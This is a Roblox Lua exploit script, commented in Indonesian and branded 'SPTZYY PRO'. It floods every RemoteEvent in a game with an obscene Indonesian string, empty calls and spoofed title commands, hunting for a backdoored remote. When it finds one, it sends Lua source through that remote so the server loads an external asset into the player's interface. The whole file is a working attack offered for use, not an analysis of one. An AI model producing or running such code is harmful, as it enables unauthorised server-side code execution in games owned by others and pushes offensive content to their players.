local modelName = "sptzyy"
local zyy = nil
local lastFired = nil

-- Fungsi untuk menampilkan notifikasi
local function showNotification(title, text, duration)
    duration = duration or 3
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = title,
        Text = text,
        Icon = "",
        Duration = duration,
    })
end

-- Notifikasi memulai proses
showNotification("SPTZYY PRO", "Starting script execution...", 2)

-- Hapus objek dengan nama modelName dari workspace
showNotification("CLEANUP", "Searching for existing "..modelName.." objects...", 2)
local deletedCount = 0
for _, obj in ipairs(workspace:GetChildren()) do
    if obj.Name == modelName then
        obj:Destroy()
        deletedCount = deletedCount + 1
        task.wait(0.1)
    end
end
showNotification("CLEANUP", "Removed "..deletedCount.." "..modelName.." objects", 2)

-- Deteksi saat objek dengan nama modelName ditambahkan ke workspace
showNotification("DETECTION", "Setting up "..modelName.." detection system...", 2)
workspace.ChildAdded:Connect(function(child)
    if child.Name == modelName and zyy == nil then
        zyy = lastFired
        showNotification("SUCCESS", modelName.." object detected and linked!", 3)
        print("Found zyy!")
    end
end)

local payload = "KONTOL MESUM😂"

-- FASE 1: Kirim payload ke semua RemoteEvent yang ditemukan
showNotification("PHASE 1", "Sending payload to all RemoteEvents...", 2)
local phase1Count = 0
for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
    if remote:IsA("RemoteEvent") then
        pcall(function()
            remote:FireServer(payload)
            phase1Count = phase1Count + 1
        end)
        lastFired = remote
        game:GetService("RunService").RenderStepped:Wait()
    end
end
showNotification("PHASE 1 COMPLETE", "Sent payload to "..phase1Count.." RemoteEvents", 2)

task.wait(0.5)

-- FASE 2: Kirim payload kosong ke semua RemoteEvent
showNotification("PHASE 2", "Sending empty payload to all RemoteEvents...", 2)
local phase2Count = 0
for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
    if remote:IsA("RemoteEvent") then
        pcall(function()
            remote:FireServer()
            phase2Count = phase2Count + 1
        end)
        lastFired = remote
        game:GetService("RunService").RenderStepped:Wait()
    end
end
showNotification("PHASE 2 COMPLETE", "Sent empty payload to "..phase2Count.." RemoteEvents", 2)

-- FITUR TITLE DI AVATAR
showNotification("AVATAR MODS", "Applying avatar modifications...", 2)
local function changePlayerTitle(titleText)
    local player = game.Players.LocalPlayer
    if player then
        -- Method 1: Melalui HumanoidDescription
        if player.Character then
            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                local desc = humanoid:GetAppliedDescription()
                desc.Name = titleText
                humanoid:ApplyDescription(desc)
                showNotification("TITLE SET", "Applied title: "..titleText, 2)
            end
        end
        
        -- Method 2: Melalui PlayerGui (jika ada UI title)
        if player:FindFirstChild("PlayerGui") then
            for _, gui in ipairs(player.PlayerGui:GetDescendants()) do
                if gui:IsA("TextLabel") or gui:IsA("TextButton") then
                    if string.find(string.lower(gui.Name), "title") or string.find(string.lower(gui.Text), "title") then
                        gui.Text = titleText
                    end
                end
            end
        end
        
        -- Method 3: Broadcast ke semua RemoteEvent
        local titleBroadcastCount = 0
        for _, remote in ipairs(game:GetDescendants()) do
            if remote:IsA("RemoteEvent") then
                pcall(function()
                    remote:FireServer("SetTitle", titleText)
                    remote:FireServer("ChangeTitle", titleText)
                    remote:FireServer("UpdateTitle", titleText)
                    titleBroadcastCount = titleBroadcastCount + 1
                end)
            end
        end
        showNotification("TITLE BROADCAST", "Broadcasted title to "..titleBroadcastCount.." events", 2)
    end
end

-- FITUR LAINNYA UNTUK AVATAR
local function modifyAvatarFeatures()
    local player = game.Players.LocalPlayer
    
    -- Ubah display name
    pcall(function()
        player.DisplayName = "SPTZYY PRO"
        showNotification("DISPLAY NAME", "Changed to: SPTZYY PRO", 2)
    end)
    
    -- Ubah chat color (jika tersedia)
    pcall(function()
        if player:FindFirstChild("ChatColor") then
            player.ChatColor = BrickColor.new("Bright red")
            showNotification("CHAT COLOR", "Changed to Bright Red", 2)
        end
    end)
    
    -- Tambahkan aura/effect
    if player.Character then
        local highlight = Instance.new("Highlight")
        highlight.Name = "SPTZYYAura"
        highlight.FillColor = Color3.fromRGB(255, 0, 0)
        highlight.OutlineColor = Color3.fromRGB(255, 255, 0)
        highlight.Parent = player.Character
        showNotification("AURA", "Red aura applied to character", 2)
    end
    
    -- Ubah ukuran karakter
    pcall(function()
        if player.Character then
            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
                showNotification("VIEW DISTANCE", "View distance modified", 2)
            end
        end
    end)
end

-- Eksekusi fitur avatar
changePlayerTitle("⚡ SPTZYY PRO ⚡")
modifyAvatarFeatures()

-- PROSES AKHIR: Cek zyy dan eksekusi payload
showNotification("FINAL PHASE", "Checking "..modelName.." status...", 2)
if zyy and typeof(zyy) == "Instance" then
    showNotification("ZYY FOUND", "Executing final payload...", 2)
    local playerName = game.Players.LocalPlayer.Name
    local insertPayload = [[
        local player = game.Players:FindFirstChild("]] .. playerName .. [[")
        if player and player:FindFirstChild("PlayerGui") then
            local asset = game:GetService("InsertService"):LoadAsset(73729830375562)
            asset.Parent = player.PlayerGui
            for _, child in ipairs(asset:GetChildren()) do
                child.Parent = player.PlayerGui
            end
            asset:Destroy()
        end
    ]]
    zyy:FireServer(insertPayload)
    showNotification("SUCCESS", "Final payload delivered via zyy!", 3)
else
    showNotification("WARNING", modelName.." object not detected", 3)
end

-- Notifikasi sukses akhir
showNotification("🎉 SPTZYY PRO 🎉", "All features activated successfully!\nTitle: ⚡ SPTZYY PRO ⚡\nAura: Active\nMods: Complete", 5)

-- Ringkasan eksekusi
task.wait(1)
showNotification("EXECUTION SUMMARY", 
    "Phase 1: "..phase1Count.." events\n"..
    "Phase 2: "..phase2Count.." events\n"..
    "Status: COMPLETE", 5)